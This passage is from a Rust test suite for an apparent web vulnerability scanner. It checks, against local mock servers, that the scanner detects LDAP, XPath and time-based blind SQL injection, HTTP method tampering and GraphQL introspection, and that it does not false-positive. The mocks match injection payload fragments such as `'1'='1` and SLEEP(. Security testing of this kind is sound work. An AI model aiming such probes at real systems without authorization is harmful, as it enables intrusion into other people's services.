            .expect("expected ldap-injection finding");
        assert_eq!(hit.severity.as_label(), "high");
        assert!(hit.references.iter().any(|r| r == "CWE-90"));
    }

    #[tokio::test]
    async fn ldap_no_false_positive() {
        let addr = start_ldap_mock(false).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/search?uid=alice", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        let mut r = Response::new(200);
        r.body = b"<html>welcome</html>".to_vec();
        t.response = Some(r);
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::LdapInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(findings.iter().all(|f| f.detector != "ldap-injection"));
    }

    /// XPath mock — returns an `XPathException` error block when the
    /// query value contains an XPath boolean payload. Non-vulnerable
    /// variant always returns the same body.
    async fn start_xpath_mock(vulnerable: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line =
                        req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let target =
                        first_line.split_whitespace().nth(1).unwrap_or("/").to_string();
                    let qs = target.split('?').nth(1).unwrap_or("").to_string();
                    let decoded = percent_encoding::percent_decode_str(&qs)
                        .decode_utf8_lossy()
                        .to_string();
                    // XPath payloads all contain `'1'='1` or `or 1=1`.
                    let has_payload = decoded.contains("'1'='1")
                        || decoded.contains("1=1 or 'a'='a");
                    let body = if vulnerable && has_payload {
                        "XPathException: XPST0003 at MS.Internal.Xml.XPath.XPathParser.ParsePrimaryExpr".to_string()
                    } else {
                        "<html>no results</html>".to_string()
                    };
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_xpath_injection() {
        let addr = start_xpath_mock(true).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/users?name=alice", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::XpathInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        let hit = findings
            .iter()
            .find(|f| f.detector == "xpath-injection")
            .expect("expected xpath-injection finding");
        assert_eq!(hit.severity.as_label(), "high");
        assert!(hit.references.iter().any(|r| r == "CWE-91"));
    }

    #[tokio::test]
    async fn xpath_no_false_positive() {
        let addr = start_xpath_mock(false).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/users?name=alice", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        let mut r = Response::new(200);
        r.body = b"<html>no results</html>".to_vec();
        t.response = Some(r);
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::XpathInjection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(findings.iter().all(|f| f.detector != "xpath-injection"));
    }

    /// Blind-SQL-time mock — sleeps 2.1 s before responding when the
    /// request path contains `SLEEP(`, `pg_sleep(`, or `WAITFOR`.
    /// Otherwise responds immediately.
    async fn start_blind_sql_mock(vulnerable: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line =
                        req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let target =
                        first_line.split_whitespace().nth(1).unwrap_or("/").to_string();
                    let decoded = percent_encoding::percent_decode_str(&target)
                        .decode_utf8_lossy()
                        .to_string()
                        .to_uppercase();
                    let has_delay = decoded.contains("SLEEP(")
                        || decoded.contains("PG_SLEEP(")
                        || decoded.contains("WAITFOR");
                    if vulnerable && has_delay {
                        tokio::time::sleep(Duration::from_millis(2_100)).await;
                    }
                    let body = "ok";
                    let resp = format!(
                        "HTTP/1.1 200 OK\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_blind_sql_time_injection() {
        let addr = start_blind_sql_mock(true).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/search?q=hello", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        // elapsed_ms defaults to 0 which is well under the 1000 ms
        // floor so the probe will run.
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                // Opt-in — need to pass BlindSqlTime explicitly.
                probes: vec![Probe::BlindSqlTime],
                per_insertion_timeout_ms: 10_000,
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        let hit = findings
            .iter()
            .find(|f| f.detector == "blind-sqli-time")
            .expect("expected blind-sqli-time finding");
        assert_eq!(hit.severity.as_label(), "high");
        assert!(hit.references.iter().any(|r| r == "CWE-89"));
    }

    #[tokio::test]
    async fn blind_sql_time_no_false_positive() {
        let addr = start_blind_sql_mock(false).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/search?q=hello", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::BlindSqlTime],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().all(|f| f.detector != "blind-sqli-time"),
            "fast server must not false-positive on timing"
        );
    }

    /// Mock for method-tampering tests. When `permissive = true`,
    /// the mock accepts any method and returns 200; otherwise it
    /// returns 405 for non-GET requests.
    async fn start_method_mock(permissive: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 2048];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let req = String::from_utf8_lossy(&buf[..n]).to_string();
                    let first_line =
                        req.lines().next().unwrap_or("GET / HTTP/1.1").to_string();
                    let method =
                        first_line.split_whitespace().next().unwrap_or("GET").to_string();
                    let (status, body) = if method == "GET" {
                        (200, "ok")
                    } else if permissive {
                        (200, "accepted")
                    } else {
                        (405, "method not allowed")
                    };
                    let resp = format!(
                        "HTTP/1.1 {status} ..\r\nContent-Type: text/plain\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_method_tampering_when_put_accepted() {
        let addr = start_method_mock(true).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/profile", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::MethodTampering],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        let put_hit = findings
            .iter()
            .find(|f| f.detector == "method-tampering" && f.title.contains("PUT"))
            .expect("expected PUT method-tampering finding");
        assert_eq!(put_hit.severity.as_label(), "high");
    }

    #[tokio::test]
    async fn method_tampering_no_fp_when_405() {
        let addr = start_method_mock(false).await;
        let req = Request::new(
            "GET",
            &format!("http://127.0.0.1:{}/profile", addr.port()),
        )
        .unwrap();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::MethodTampering],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().all(|f| f.detector != "method-tampering"),
            "405 responses must not false-positive"
        );
    }

    /// Mock for GraphQL introspection. When `enabled = true`,
    /// responds to any POST with a mini schema document containing
    /// `__schema`. Otherwise returns 400 with "introspection disabled".
    async fn start_graphql_mock(enabled: bool) -> std::net::SocketAddr {
        let listener = TcpListener::bind("127.0.0.1:0").await.unwrap();
        let addr = listener.local_addr().unwrap();
        tokio::spawn(async move {
            loop {
                let (mut s, _) = match listener.accept().await {
                    Ok(x) => x,
                    Err(_) => break,
                };
                tokio::spawn(async move {
                    let mut buf = vec![0u8; 4096];
                    let n = s.read(&mut buf).await.unwrap_or(0);
                    let _ = String::from_utf8_lossy(&buf[..n]).to_string();
                    let (status, body) = if enabled {
                        (
                            200,
                            r#"{"data":{"__schema":{"types":[{"name":"String"},{"name":"User"},{"name":"Query"}]}}}"#,
                        )
                    } else {
                        (400, r#"{"errors":[{"message":"introspection disabled"}]}"#)
                    };
                    let resp = format!(
                        "HTTP/1.1 {status} ..\r\nContent-Type: application/json\r\nContent-Length: {}\r\n\r\n{body}",
                        body.len()
                    );
                    let _ = s.write_all(resp.as_bytes()).await;
                });
            }
        });
        addr
    }

    #[tokio::test]
    async fn detects_graphql_introspection() {
        let addr = start_graphql_mock(true).await;
        let mut req = Request::new(
            "POST",
            &format!("http://127.0.0.1:{}/graphql", addr.port()),
        )
        .unwrap();
        req.headers.set("Content-Type", "application/json");
        req.body = b"{\"query\":\"{me{id}}\"}".to_vec();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::GraphqlIntrospection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        let hit = findings
            .iter()
            .find(|f| f.detector == "graphql-introspection")
            .expect("expected graphql-introspection finding");
        assert_eq!(hit.severity.as_label(), "medium");
    }

    #[tokio::test]
    async fn graphql_introspection_no_fp_when_disabled() {
        let addr = start_graphql_mock(false).await;
        let mut req = Request::new(
            "POST",
            &format!("http://127.0.0.1:{}/graphql", addr.port()),
        )
        .unwrap();
        req.headers.set("Content-Type", "application/json");
        req.body = b"{\"query\":\"{me{id}}\"}".to_vec();
        let mut t = Transaction::new(req);
        t.response = Some(Response::new(200));
        let scanner = ActiveScanner::new(
            ActiveScanConfig {
                probes: vec![Probe::GraphqlIntrospection],
                ..Default::default()
            },
            HttpClientConfig::default(),
            Scope::new(),
        );
        let findings = scanner.scan(&t).await.unwrap();
        assert!(
            findings.iter().all(|f| f.detector != "graphql-introspection"),
            "server with introspection disabled must not false-positive"
        );
    }
}
